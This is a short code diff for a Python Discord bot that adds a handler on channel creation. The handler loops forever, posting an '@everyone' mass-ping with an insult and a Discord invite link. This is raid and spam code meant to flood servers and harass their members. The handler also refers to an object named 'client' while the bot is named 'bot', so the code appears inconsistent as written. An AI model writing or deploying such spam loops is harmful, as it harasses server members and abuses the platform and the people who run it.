@@ -17,7 +17,12 @@ bot = commands.Bot(command_prefix=".", intents=intents)
 bot.remove_command('help')
 
 
-
+@client.event
+async def on_guild_channel_create(channel):
+    guild = channel.guild
+    if len(guild.channels) >= 2:
+        while True:
+            await channel.send("@everyone get fucked losers LMAOOO https://discord.gg/G79YRQ2tvX")
 
 @bot.event
 async def on_ready():
